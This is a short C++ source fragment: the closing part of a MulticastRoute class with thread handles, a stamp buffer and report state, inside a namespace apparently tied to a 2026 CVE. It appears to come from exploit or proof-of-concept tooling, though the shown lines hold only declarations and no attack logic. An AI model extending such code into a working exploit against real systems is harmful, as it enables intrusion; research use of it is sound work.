            return static_cast<MulticastRoute *>(self)->consumer_main();
        }

        MulticastRouteConfig config_{};
        alignas(64) std::uint8_t stamp_[kMaxStampBytes] = {};
        MulticastRouteShared shared_{};
        MulticastRouteReport report_{};
        pthread_t waiter_{};
        pthread_t owner_{};
        pthread_t consumer_{};
        bool waiter_started_ = false;
        bool owner_started_ = false;
        bool consumer_started_ = false;
    };
}  // namespace ghostlock::backend::cve_2026_43499::seam
